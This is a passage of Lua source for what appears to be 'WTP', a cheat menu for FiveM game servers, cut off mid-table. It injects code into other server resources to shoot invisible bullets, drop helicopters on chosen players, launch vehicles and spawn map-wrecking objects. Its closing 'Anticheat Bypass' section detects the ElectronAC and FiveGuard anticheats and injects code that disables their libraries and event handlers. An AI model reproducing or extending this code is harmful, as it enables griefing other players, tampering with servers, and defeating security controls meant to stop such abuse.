                            WTP.SafeRunNative(ShootSingleBulletBetweenCoords,
                                camCoords.x, camCoords.y, camCoords.z,
                                targetPos.x, targetPos.y, targetPos.z,
                                100,           -- damage
                                true,          -- isAudible
                                weaponHash,
                                playerPed,
                                true,          -- isInvisible
                                false,         -- isCritical
                                100000.0       -- speed
                            )
                        end
                    ]], weapon))
                end
            end

            if IsDisabledControlJustPressed(0, 24) then
                local action = hoveredOption

                if action == "Teleport" then
                    executeCode(targetSafeRes, [[
                        if _G.WTPFreecamObject then
                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }
                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end
                                return -1
                            end

                            function _G.hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            _G.hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)

                            local camCoords = WTP.SafeRunNative(GetCamCoord, _G.WTPFreecamObject)
                            local rot = WTP.SafeRunNative(GetCamRot, _G.WTPFreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            if hit then
                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                    local vehicle = entityHit
                                    local playerPed = PlayerPedId()
                                    local seat = GetEmptySeat(vehicle)
                                    if seat == -1 then
                                        TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                    elseif seat >= 0 then
                                        TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                    else
                                        print("[^5WTP^7]: There aren't any seats available in this vehicle.")
                                    end
                                else
                                    WTP.SafeRunNative(SetEntityCoordsNoOffset, PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false)
                                end
                            else
                                print("[^5WTP^7]: There aren't any valid locations to teleport to.")
                            end
                        end
                    ]])
                elseif action == "Helicopter Attack" then
                    executeCode(targetSafeRes, [[
                        if _G.WTPFreecamObject then
                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            local me = PlayerPedId()
                            local cam = WTP.SafeRunNative(GetCamCoord, _G.WTPFreecamObject)
                            local rot = WTP.SafeRunNative(GetCamRot, _G.WTPFreecamObject, 2)
                            local fwd = RotationToDirection(rot)

                            local rayTo = cam + fwd * 1000.0

                            local handle = StartShapeTestRay(
                                cam.x, cam.y, cam.z,
                                rayTo.x, rayTo.y, rayTo.z,
                                -1, me, 0
                            )

                            local _, hit, _, _, entityHit = GetShapeTestResult(handle)
                            if hit and entityHit ~= 0 and IsEntityAPed(entityHit) then
                                local targetPed = entityHit
                                local coords = GetEntityCoords(targetPed)
                                WTP.SafeRunNative(CreateThread, function()
                                    local vehicleHash = GetHashKey("frogger")
                                    RequestModel(vehicleHash)
                                    while not HasModelLoaded(vehicleHash) do
                                        Wait(0)
                                    end
                                    local createdCar = WTP.SafeRunNative(CreateVehicle, vehicleHash, coords.x, coords.y, coords.z, 0.0, true, false)
                                    WTP.SafeRunNative(Wait, 200)
                                    WTP.SafeRunNative(SetEntityCoords, createdCar, coords.x, coords.y, coords.z + 30, true, true, true)
                                    WTP.SafeRunNative(SetVehicleEngineHealth, createdCar, -4000.0)
                                    WTP.SafeRunNative(SetVehicleBodyHealth, createdCar, 0.0)
                                    WTP.SafeRunNative(SetVehicleFuelLevel, createdCar, 1000.0)
                                    WTP.SafeRunNative(SetEntityVelocity, createdCar, 0.0, 0.0, -80.0)
                                    WTP.SafeRunNative(SetModelAsNoLongerNeeded, vehicleHash)
                                end)
                            end
                        end
                    ]])
                elseif action == "Shoot Vehicle" then
                    if IsDisabledControlPressed(0, 24) then -- LEFT CLICK
                        local model = FreecamVehicleList[CurrentVehicleIndex]

                        executeCode(targetSafeRes, [[
                            if _G.WTPFreecamObject then
                                local camCoords = WTP.SafeRunNative(GetCamCoord, _G.WTPFreecamObject)
                                local rot = WTP.SafeRunNative(GetCamRot, _G.WTPFreecamObject, 2)

                                local function RotationToDirection(rot)
                                    local z = math.rad(rot.z)
                                    local x = math.rad(rot.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z)*num, math.cos(z)*num, math.sin(x))
                                end

                                local forward = RotationToDirection(rot)
                                local shootCoords = camCoords
                                local targetCoords = camCoords + (forward * 50.0)
                                local heading = rot.z
                                local model = "]] .. model .. [["

                                local hash = GetHashKey(model)
                                RequestModel(hash)
                                while not HasModelLoaded(hash) do Wait(0) end
                                local veh = WTP.SafeRunNative(CreateVehicle, hash, shootCoords.x, shootCoords.y, shootCoords.z, heading, true, false)
                                WTP.SafeRunNative(SetModelAsNoLongerNeeded, hash)
                                if veh and DoesEntityExist(veh) then
                                    local vec = (targetCoords - shootCoords) * 2.0
                                    WTP.SafeRunNative(SetEntityVelocity, veh, vec.x, vec.y, vec.z)
                                end
                            end
                        ]])
                    end
                elseif action == "Map Destroyer" then
                    if IsDisabledControlPressed(0, 24) then -- LEFT CLICK
                        local object = FreecamMapDestroyerList[CurrentMapDestroyerIndex]

                        if object == "City" then
                            object = "dt1_lod_slod3"
                        elseif object == "Docks" then
                            object = "id2_lod_slod4"
                        elseif object == "Playa Vista" then
                            object = "kt1_lod_slod4"
                        elseif object == "Mountain" then
                            object = "ch2_lod_slod3"
                        elseif object == "Pink Cage" then
                            object = "hw1_lod_slod4"
                        elseif object == "Vespucci" then
                            object = "kt1_lod_slod4"
                        elseif object == "Mega Mall" then
                            object = "sc1_lod_slod4"
                        elseif object == "Platform" then
                            object = "xs_propint2_building_base_01"
                        elseif object == "Big Ring" then
                            object = "ar_prop_ar_neon_gate8x_02a"
                        elseif object == "Tube" then
                            object = "sr_prop_stunt_tube_xs_02a"
                        elseif object == "Dessert" then
                            object = "xs_terrain_set_dyst_01_grnd"
                        elseif object == "Goal" then
                            object = "xs_prop_arena_goal"
                        elseif object == "Big Statue 2" then
                            object = "xs_propint3_waste_01_statues"
                        elseif object == "House" then
                            object = "sum_prop_ac_track_paddock_01"
                        end

                        executeCode(targetSafeRes, [[
                            if _G.WTPFreecamObject then
                                local camCoords = WTP.SafeRunNative(GetCamCoord, _G.WTPFreecamObject)
                                local rot = WTP.SafeRunNative(GetCamRot, _G.WTPFreecamObject, 2)
                                local function RotationToDirection(r)
                                    local z = math.rad(r.z)
                                    local x = math.rad(r.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end
                                local forward = RotationToDirection(rot)
                                local targetCoords = camCoords + (forward * 10.0)
                                local heading = rot.z
                                local modelName = "]] .. object .. [["
                                WTP.SafeRunNative(CreateThread, function()
                                    local model = WTP.SafeRunNative(GetHashKey, modelName)
                                    WTP.SafeRunNative(RequestModel, model)
                                    
                                    local timeout = WTP.SafeRunNative(GetGameTimer) + 5000
                                    while not WTP.SafeRunNative(HasModelLoaded, model) and WTP.SafeRunNative(GetGameTimer) < timeout do
                                        WTP.SafeRunNative(Wait, 10)
                                    end
                                    if not WTP.SafeRunNative(HasModelLoaded, model) then return end
                                    local obj = WTP.SafeRunNative(CreateObject, model, targetCoords.x, targetCoords.y, targetCoords.z, true, true, false)
                                    if obj ~= 0 and WTP.SafeRunNative(DoesEntityExist, obj) then
                                        WTP.SafeRunNative(SetEntityHeading, obj, heading)
                                        WTP.SafeRunNative(PlaceObjectOnGroundProperly, obj)
                                        WTP.SafeRunNative(SetEntityAsMissionEntity, obj, true, true)
                                    end
                                    
                                    WTP.SafeRunNative(SetModelAsNoLongerNeeded, model)
                                end)
                            end
                        ]])
                    end
                elseif action == "Spawn Object" then
                    if IsDisabledControlPressed(0, 24) then -- LEFT CLICK
                        local object = FreecamSpawnObjectList[CurrentSpawnObjectIndex]

                        if object == "Big Tires" then
                            object = "xs_propint4_waste_07_tires"
                        elseif object == "Dome" then
                            object = "xs_propint2_building_03"
                        elseif object == "Black Surface" then
                            object = "vw_prop_vw_bblock_huge_04"
                        elseif object == "Spinning Object" then
                            object = "xs_propint2_platform_03"
                        elseif object == "Arena Fire" then
                            object = "xs_prop_arena_pit_fire_03a_wl"
                        elseif object == "Landmine" then
                            object = "xs_prop_arena_landmine_03a_sf"
                        elseif object == "Big Wheels" then
                            object = "xs_prop_arena_turntable_02a_wl"
                        elseif object == "Cnt Arena" then
                            object = "xs_prop_arena_turntable_02a"
                        elseif object == "Arena Skull" then
                            object = "xs_prop_arena_landmine_01a"
                        elseif object == "Arena Bomb" then
                            object = "xs_prop_arena_bomb_m"
                        elseif object == "Waste Rims" then
                            object = "xs_propint3_waste_02_rims"
                        end

                        executeCode(targetSafeRes, [[
                            if _G.WTPFreecamObject then
                                local camCoords = WTP.SafeRunNative(GetCamCoord, _G.WTPFreecamObject)
                                local rot = WTP.SafeRunNative(GetCamRot, _G.WTPFreecamObject, 2)
                                local function RotationToDirection(r)
                                    local z = math.rad(r.z)
                                    local x = math.rad(r.x)
                                    local num = math.abs(math.cos(x))
                                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                end
                                local forward = RotationToDirection(rot)
                                local targetCoords = camCoords + (forward * 10.0)
                                local heading = rot.z
                                local modelName = "]] .. object .. [["
                                WTP.SafeRunNative(CreateThread, function()
                                    local model = WTP.SafeRunNative(GetHashKey, modelName)
                                    WTP.SafeRunNative(RequestModel, model)
                                    
                                    local timeout = WTP.SafeRunNative(GetGameTimer) + 5000
                                    while not WTP.SafeRunNative(HasModelLoaded, model) and WTP.SafeRunNative(GetGameTimer) < timeout do
                                        WTP.SafeRunNative(Wait, 10)
                                    end
                                    if not WTP.SafeRunNative(HasModelLoaded, model) then return end
                                    local obj = WTP.SafeRunNative(CreateObject, model, targetCoords.x, targetCoords.y, targetCoords.z, true, true, false)
                                    if obj ~= 0 and WTP.SafeRunNative(DoesEntityExist, obj) then
                                        WTP.SafeRunNative(SetEntityHeading, obj, heading)
                                        WTP.SafeRunNative(PlaceObjectOnGroundProperly, obj)
                                        WTP.SafeRunNative(SetEntityAsMissionEntity, obj, true, true)
                                    end
                                    
                                    WTP.SafeRunNative(SetModelAsNoLongerNeeded, model)
                                end)
                            end
                        ]])
                    end
                end
            end
        end

        local hoveredTab = CurrentMenu[HoveredIndex]

        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    if IsControlPressed(0, 174) and now - lastSliderPress > sliderDelay then
                        WTP:ScrollTwo("Left")
                        lastSliderPress = now
                    elseif IsControlPressed(0, 175) and now - lastSliderPress > sliderDelay then
                        WTP:ScrollTwo("Right")
                        lastSliderPress = now
                    end
                else
                    if IsControlPressed(0, 174) then
                        WTP:ScrollTwo("Left")
                    elseif IsControlPressed(0, 175) then
                        WTP:ScrollTwo("Right")
                    end
                end
            end
        end
    end
end)

local lastScrollPress = 0
local scrollDelay = 120
local lastSliderPress = 0
local sliderDelay = 120
local lastCategoryPress = 0
local categoryDelay = 120

MachoOnKeyDown(function(Callback)
    local keyCode = tonumber(Callback) or Callback
    local keyName = MappedKeys[keyCode] or "Unknown"
    local scrollNow = GetGameTimer()

    if keyName == MenuKey then
        if not IsVisible and MenuOpenable then
            WTP:ShowUI()
        end
    elseif keyName == "Backspace" then
        if IsVisible and MenuOpenable then WTP:Backspace() end
    elseif keyName == "Enter" then
        if IsVisible and MenuOpenable then WTP:Enter() end
    elseif keyName == "Q" and scrollNow - lastCategoryPress > categoryDelay then
        if IsVisible and MenuOpenable then WTP:PrevCategory() end
    elseif keyName == "E" and scrollNow - lastCategoryPress > categoryDelay then
        if IsVisible and MenuOpenable then WTP:NextCategory() end
    elseif keyName == "ArrowUp" and scrollNow - lastScrollPress > scrollDelay then
        if IsVisible then WTP:ScrollOne("Up") lastScrollPress = scrollNow end
    elseif keyName == "ArrowDown" and scrollNow - lastScrollPress > scrollDelay then
        if IsVisible then WTP:ScrollOne("Down") lastScrollPress = scrollNow end
    elseif keyName == "ArrowLeft" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" and scrollNow - lastSliderPress > sliderDelay then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    WTP:ScrollTwo("Left")
                    lastSliderPress = now
                else
                    WTP:ScrollTwo("Left")
                end
            elseif hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox" then
                WTP:ScrollTwo("Left")
            end
        end
    elseif keyName == "ArrowRight" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" and scrollNow - lastSliderPress > sliderDelay then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    WTP:ScrollTwo("Right")
                    lastSliderPress = now
                else
                    WTP:ScrollTwo("Right")
                end
            elseif hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox" then
                WTP:ScrollTwo("Right")
            end
        end
    elseif keyName == "PageDown" then
        local hoveredTab = CurrentMenu[HoveredIndex]
        if IsVisible and MenuOpenable and hoveredTab and (hoveredTab.type == "button" or hoveredTab.type == "checkbox" or hoveredTab.type == "slider-checkbox" or hoveredTab.type == "scrollable-checkbox") then
            WTP:HideUI()
            Wait(250)
            KeyboardInput(("Bind %s"):format(hoveredTab.label), "", function(val)
                for vk, name in pairs(MappedKeys) do
                    if name:lower() == val:lower() then
                        local fivemControl = VK_TO_FIVEM[vk]

                        for i, data in pairs(MenuKeybinds) do
                            if data.keyRaw == vk then
                                WTP:Notify("error", "WTP", "There is already a keybind with that key!", 3000)
                                return
                            end
                        end

                        if fivemControl then
                            MenuKeybinds[#MenuKeybinds + 1] = {
                                key = fivemControl,
                                keyRaw = vk,
                                keyLabel = MappedKeys[vk],
                                type = hoveredTab.type,
                                label = hoveredTab.label,
                                hold = hoveredTab.hold,
                                checked = hoveredTab.checked or false,
                                value = hoveredTab.value or 1.0,
                                step = hoveredTab.step or 0.25,
                                min = hoveredTab.min or 0.25,
                                max = hoveredTab.max or 5.0,
                                onSelect = hoveredTab.onSelect,
                            }

                            WTP:ShowKeybindList(MenuKeybinds)
                        end

                        Wait(500)
                        WTP:ShowUI()

                        return
                    end
                end
            end, "keybind")
        end
    else
        if MenuOpenable then
            for _, data in pairs(MenuKeybinds) do
                if data.type == "button" then
                    local key = data.keyRaw
                    if key then
                        if key == keyCode then
                            data.onSelect()
                            WTP:Notify("success", "WTP", ("You have executed %s!"):format(data.label), 3000)
                        end
                    end
                elseif data.type == "checkbox" then
                    local key = data.keyRaw
                    if key and key == keyCode then
                        data.checked = not data.checked

                        WTP:UpdateTabChecked(ActiveMenu, data.label, data.checked)

                        if data.onSelect then
                            data.onSelect(data.checked)
                        end

                        WTP:ShowKeybindList(MenuKeybinds)
                        WTP:Notify(data.checked and "success" or "error", "WTP", ("You have %s %s!"):format(data.checked and "enabled" or "disabled", data.label), 3000)

                        if IsVisible then
                            WTP:UpdateElements(CurrentMenu)
                        end
                    end
                elseif data.type == "slider-checkbox" then
                    local key = data.keyRaw
                    if key and key == keyCode then
                        data.checked = not data.checked

                        WTP:UpdateTabChecked(ActiveMenu, data.label, data.checked)

                        if data.onSelect then
                            data.onSelect(data.value, data.checked)
                        end

                        WTP:ShowKeybindList(MenuKeybinds)
                        WTP:Notify(data.checked and "success" or "error", "WTP", ("You have %s %s!"):format(data.checked and "enabled" or "disabled", data.label), 3000)

                        if IsVisible then
                            WTP:UpdateElements(CurrentMenu)
                        end
                    end
                end
            end
        end
    end
end)

function WTP:InListMenu()
    return CurrentCategories and CurrentCategories[CurrentCategoryIndex] and (CurrentCategories[CurrentCategoryIndex].label == "List" or CurrentCategories[CurrentCategoryIndex].label == "Safe")
end

function WTP:SelectEveryone()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    for i, tab in ipairs(category.tabs) do
        if tab.type == "checkbox" then
            tab.checked = true
            if tab.serverId and tonumber(tab.serverId) then
                CPlayers[tonumber(tab.serverId)] = true
            end
        end
    end

    self:UpdateElements(CurrentMenu)
end

function WTP:UnselectEveryone()
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    for i, tab in ipairs(category.tabs) do
        if tab.type == "checkbox" then
            tab.checked = false
            if tab.serverId and tonumber(tab.serverId) then
                CPlayers[tonumber(tab.serverId)] = false
            end
        end
    end

    self:UpdateElements(CurrentMenu)
end

function WTP:ClearSelection()
    CPlayers = {}
    if CurrentCategories and CurrentCategories[CurrentCategoryIndex] then
        local category = CurrentCategories[CurrentCategoryIndex]
        if category.label == "List" and category.tabs then
            for _, tab in ipairs(category.tabs) do
                if tab.type == "checkbox" then
                    tab.checked = false
                end
            end
        end
    end

    WTP:UnselectEveryone()
end

function WTP:UpdateListMenu()
    if not IsVisible then return end
    if not CurrentCategories or not CurrentCategories[CurrentCategoryIndex] then return end
    local category = CurrentCategories[CurrentCategoryIndex]
    if category.label ~= "List" then return end

    local coords = GetEntityCoords(PlayerPedId())
    if not coords then return end

    local nearbyPlayers = self:GetNearbyPlayers(coords, 500.0, true)
    local dividerIndex
    for i, tab in ipairs(category.tabs) do
        if tab.type == "divider" and tab.label == "Nearby Players" then
            dividerIndex = i
            break
        end
    end
    if not dividerIndex then return end

    for i = #category.tabs, dividerIndex + 1, -1 do
        table.remove(category.tabs, i)
    end

    if #nearbyPlayers == 0 then
        category.tabs[#category.tabs + 1] = {
            type = "button",
            label = "No Nearby Players",
            disabled = true
        }
    else
        table.sort(nearbyPlayers, function(a, b) return tonumber(a.serverId) < tonumber(b.serverId) end)
        for _, player in ipairs(nearbyPlayers) do
            local sid = tonumber(player.serverId)
            if sid and player.name then
                local targetPed = GetPlayerPed(GetPlayerFromServerId(sid))
                local _, currentWeapon = GetCurrentPedWeapon(targetPed)
                local currentVehicle = GetVehiclePedIsUsing(targetPed)
                local vehicleLabel = "On Foot"
                if currentVehicle ~= 0 then
                    local model = GetEntityModel(currentVehicle)
                    local displayLabel = GetDisplayNameFromVehicleModel(model)
                    local text = GetLabelText(displayLabel)
                    vehicleLabel = (text ~= "NULL") and text or displayLabel
                end

                category.tabs[#category.tabs + 1] = {
                    type = "checkbox",
                    label = ("> %s - %s"):format(sid, player.name),
                    serverId = sid,
                    id = sid,
                    checked = CPlayers[sid] or false,
                    name = player.name,
                    vehicle = currentVehicle ~= 0 and currentVehicle or nil,
                    isDriver = GetPedInVehicleSeat(currentVehicle, -1) == targetPed,
                    metaData = {
                        { key = "Distance", value = math.floor(#(GetEntityCoords(PlayerPedId()) - GetEntityCoords(targetPed))) .. "m" },
                        { key = "Health", value = GetEntityHealth(targetPed), color = "0, 255, 17" },
                        { key = "Armour", value = GetPedArmour(targetPed), color = "0, 132, 255" },
                        { key = "Weapon", value = WeaponsLabels[currentWeapon] or "Unarmed" },
                        { key = "Vehicle", value = vehicleLabel },
                        { key = "Speed", value = math.floor(GetEntitySpeed(targetPed) * 3.6) .. " km/h" },
                    },
                    onSelect = function(checked)
                        CPlayers[sid] = checked or false
                    end
                }
            end
        end
    end

    for serverId, _ in pairs(CPlayers) do
        local stillNearby = false
        for _, player in ipairs(nearbyPlayers) do
            if tonumber(player.serverId) == tonumber(serverId) then
                stillNearby = true
                break
            end
        end
        if not stillNearby then
            CPlayers[serverId] = nil
        end
    end

    HoveredIndex = math.min(HoveredIndex or 1, math.max(1, #category.tabs))

    local ok, err = pcall(function()
        self:UpdateElements(CurrentMenu)
    end)
    if not ok then
        -- print("^7[^5WTP^7]: UI update error: " .. tostring(err))
    end
end

function WTP:AssignListMenuActions()
    if not ActiveMenu then return end

    for _, subMenu in ipairs(ActiveMenu) do
        if subMenu.label == "Online Options" and subMenu.categories then
            for _, category in ipairs(subMenu.categories) do
                if category.label == "List" and category.tabs then
                    for _, tab in ipairs(category.tabs) do
                        if tab.type == "button" then
                            if tab.label == "Select Everyone" then
                                tab.onSelect = function() WTP:SelectEveryone() end
                            elseif tab.label == "Un-Select Everyone" then
                                tab.onSelect = function() WTP:UnselectEveryone() end
                            elseif tab.label == "Clear Selection" then
                                tab.onSelect = function() WTP:ClearSelection() end
                            end
                        end
                    end
                end
            end
        end
    end
end

CreateThread(function()
    while true do
        Wait(1500)
        if WTP:InListMenu() and IsVisible then
            local ok, err = pcall(function()
                WTP:UpdateListMenu()
            end)
            if not ok then
                -- print("^7[^5WTP^7]: List update error: " .. tostring(err))
            end
        end
    end
end)

Wait(1000)

WTP:AssignListMenuActions()

local electronResource = nil
local fiveguardResource = nil

local function ScanElectronAnticheat()
    for i = 0, GetNumResources() - 1 do
		local setResource = GetResourceByFindIndex(i)
		local setManifest = LoadResourceFile(setResource, 'fxmanifest.lua')

		setManifest = tostring(setManifest):lower()

		if setManifest:find('https://electron-services.com') or setManifest:find('electron services') then
            electronResource = setResource
            WTP:Notify("error", "WTP", "Detected ElectronAC in Resource: " .. setResource, 3000)
            return resource
		end
	end
    return nil
end

local function ScanFiveGuardAnticheat()
    local numResources = GetNumResources()
    for i = 0, numResources - 1 do
        local resource = GetResourceByFindIndex(i)
        if resource then
            local count = GetNumResourceMetadata(resource, "client_script")
            for j = 0, count - 1 do
                local meta = GetResourceMetadata(resource, "client_script", j)
                if meta and type(meta) == "string" and meta:lower():find("obfuscated") then
                    fiveguardResource = resource
                    WTP:Notify("error", "WTP", "Detected FiveGuard in Resource: " .. resource, 3000)
                    return true
                end
            end
        end
    end
    return false
end

function WTP:LoadBypass()
    local restrictedIPs = {
        ""
    }

    for _, ip in ipairs(restrictedIPs) do
        if currentEndpoint == ip then
            self:Notify("error", "WTP", "Bypass disabled for this server.", 3000)
            return
        end
    end

    self:Notify("info", "WTP", "Loading Anticheat Bypass...", 3000)
    ScanElectronAnticheat()
    ScanFiveGuardAnticheat()
    Wait(1000)

    if electronResource ~= nil then
        MachoInjectResource2(3, electronResource, [[
            local _n = function() end
            local _dead = {
                __index = function() return _n end,
                __call = _n,
                __newindex = _n,
                __tostring = function() return "" end,
                __len = function() return 0 end,
                __pairs = function() return _n end,
                __concat = function() return "" end
            }
       
            assert = _n
            load = function() return _n end
            math = _dead
            collectgarbage = _n
            string = _dead
            json = _dead
            table = _dead
            os = _dead
            getmetatable = function() return nil end
            type = function() return "nil" end
            debug = _dead
            pcall = function(f, ...) return true end
            xpcall = function(f, h, ...) return true end
            error = _n
            DecorSetBool = _n
            DecorGetBool = function() return false end
            tonumber = function() return 0 end
            tostring = function() return "" end
            pairs = function() return _n end
            ipairs = function() return _n end
            next = function() return nil end
            select = function(n, ...) if n == "#" then return 0 end return nil end
            rawget = function() return nil end
            rawset = _n
            unpack = function() return nil end
        ]])
        self:Notify("info", "WTP", "Loaded Bypass (ElectronAC)", 3000)
    elseif fiveguardResource ~= nil then
        MachoInjectResource2(3, fiveguardResource, [[ 
            pcall(function()
                local _, w = debug.getupvalue(EnableAllControlActions, 1)
                local _, M = debug.getupvalue(w[17], 1)
                local _, env = debug.getupvalue(M.h, 1)
                if env then env = nil end

                local function getEventHandlers()
                    local i = 1
                    while true do
                        local name, val = debug.getupvalue(AddEventHandler, i)
                        if not name then break end
                        if name == "eventHandlers" and type(val) == "table" then
                            return val
                        end
                        i = i + 1
                    end
                end

                local seen = {}
                local function scan(t)
                    if type(t) ~= "table" or seen[t] then return end
                    seen[t] = true
                    for k,v in pairs(t) do
                        if type(v) == "string" and v == "67314B49663351436761505579774D46654163554539436B4D7761326F575A49" then
                            t[k] = nil
                        elseif type(v) == "table" then
                            scan(v)
                        end
                    end
                end

                local i = 1
                while true do
                    local _, v = debug.getupvalue(AddEventHandler, i)
                    if not v then break end
                    if type(v) == "table" then scan(v) end
                    i = i + 1
                end

                local eventHandlers = getEventHandlers()
                if type(eventHandlers) == "table" then
                    local targets = {
                        ["CEventGunShot"]="Spoofed Bullet Ban Bypassed #1",["CEventGunShotBulletImpact"]="Spoofed Bullet Ban Bypassed #2",
                        ["gameEventTriggered"]="Client Manipulate Ban Bypassed",["jjspob"]="Unknown",["CEventExplosion"]="Explosion Detect Bypassed",
                        ["CEventExplosionHeard"]="Explosion Heard Bypassed",["CEventShockingExplosion"]="Shocking Explosion Bypassed",
                        ["CEventShockingGunshotFired"]="Gunshot Fired Bypassed",["CEventShockingGunshotHitPed"]="Gunshot Hit Ped Bypassed",
                        ["CEventShockingGunshotHitBuilding"]="Gunshot Hit Building Bypassed",["CEventShockingHelicopterOverhead"]="Helicopter Overhead Bypassed",
                        ["CEventShockingCarCrash"]="Car Crash Bypassed",["CEventShockingDrivingOnPavement"]="Driving On Pavement Bypassed",
                        ["CEventShockingBicycleOnPavement"]="Bicycle On Pavement Bypassed",["CEventShockingMadDriver"]="Mad Driver Bypassed",
                        ["CEventShockingPoliceInvestigating"]="Police Investigation Bypassed",["CEventShockingVisibleWeapon"]="Visible Weapon Bypassed",
                        ["CEventShockingVisibleWeaponThreat"]="Weapon Threat Bypassed",["CEventShockingDeadBody"]="Dead Body Bypassed",
                        ["CEventShockingDangerousAnimal"]="Dangerous Animal Bypassed",["CEventShockingEngineRevved"]="Engine Rev Bypassed",
                        ["CEventShockingHornSounded"]="Horn Sound Bypassed",["CEventShockingInDangerousVehicle"]="Dangerous Vehicle Bypassed",
                        ["CEventShockingNiceCar"]="Nice Car Bypassed",["CEventShockingPedKnockedIntoByPlayer"]="Ped Knocked Bypassed",
                        ["CEventShockingPotentialBlast"]="Potential Blast Bypassed",["CEventShockingPropertyDamage"]="Property Damage Bypassed",
                        ["CEventShockingRunningPed"]="Running Ped Bypassed",["CEventShockingSirens"]="Sirens Bypassed",
                        ["CEventShockingStudioBomb"]="Studio Bomb Bypassed",["CEventShockingVehicleTowed"]="Vehicle Towed Bypassed",
                        ["CEventVehicleCollision"]="Vehicle Collision Bypassed",["CEventVehicleDamage"]="Vehicle Damage Bypassed",
                        ["CEventVehicleOnFire"]="Vehicle Fire Bypassed",["CEventVehicleCreated"]="Vehicle Spawn Bypassed",
                        ["CEventVehicleUndriveable"]="Vehicle Undriveable Bypassed",["CEventPedCollisionWithPed"]="Ped Collision Bypassed",
                        ["CEventPedCollisionWithPlayer"]="Player Collision Bypassed",["CEventPedEnteredMyVehicle"]="Vehicle Enter Bypassed",
                        ["CEventPedJackingMyVehicle"]="Vehicle Jack Bypassed",["CEventPedOnCarRoof"]="Car Roof Bypassed",
                        ["CEventPedToChase"]="Ped Chase Bypassed",["CEventPlayerCollisionWithPed"]="Player Ped Collision Bypassed",
                        ["CEventPlayerDeath"]="Player Death Bypassed",["CEventPlayerUnableToEnterVehicle"]="Vehicle Enter Fail Bypassed",
                        ["CEventPlayerSpawned"]="Spawn Detect Bypassed",["CEventNetworkPlayerEnteredVehicle"]="Network Enter Vehicle Bypassed",
                        ["CEventNetworkPlayerLeftVehicle"]="Network Leave Vehicle Bypassed",["CEventNetworkEntityDamage"]="Network Damage Bypassed",
                        ["CEventNetworkHostMigration"]="Host Migration Bypassed",["CEventNetworkCheatTriggered"]="Cheat Trigger Bypassed",
                        ["CEventEntityDestroyed"]="Entity Destroy Bypassed",["CEventEntityDamaged"]="Entity Damage Bypassed",
                        ["CEventObjectCollision"]="Object Collision Bypassed",["CEventFireNearby"]="Nearby Fire Bypassed",
                        ["CEventCrimeReported"]="Crime Report Bypassed",["CEventDisturbance"]="Disturbance Bypassed",
                        ["CEventDraggedOutCar"]="Dragged Out Car Bypassed",["CEventLeaderEnteredCarAsDriver"]="Leader Enter Driver Bypassed",
                        ["CEventLeaderExitedCarAsDriver"]="Leader Exit Driver Bypassed",["CEventAcquaintancePedDead"]="Ped Dead Bypassed",
                        ["CEventAcquaintancePedHate"]="Ped Hate Bypassed",["CEventAcquaintancePedLike"]="Ped Like Bypassed",
                        ["CEventAcquaintancePedWanted"]="Ped Wanted Bypassed",["CEventDataDecisionMaker"]="Decision Maker Bypassed",
                        ["CEventHelpAmbientFriend"]="Ambient Friend Bypassed",["CEventPotentialWalkIntoFire"]="Walk Into Fire Bypassed",
